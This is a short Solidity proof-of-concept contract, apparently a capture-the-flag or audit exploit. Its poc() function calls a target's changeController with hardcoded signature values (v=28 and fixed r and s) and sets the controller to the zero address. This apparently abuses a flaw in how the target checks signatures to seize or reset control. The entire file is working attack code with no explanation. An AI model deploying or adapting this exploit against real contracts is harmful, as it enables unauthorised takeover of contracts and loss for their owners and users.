// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
interface POC {
 function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;    
}

contract Test{
    POC public lock;
    constructor(address _add){
        lock = POC(_add);
    }

    function poc() public {
        lock.changeController(28, 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91 ,0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f ,address(0));
    }
}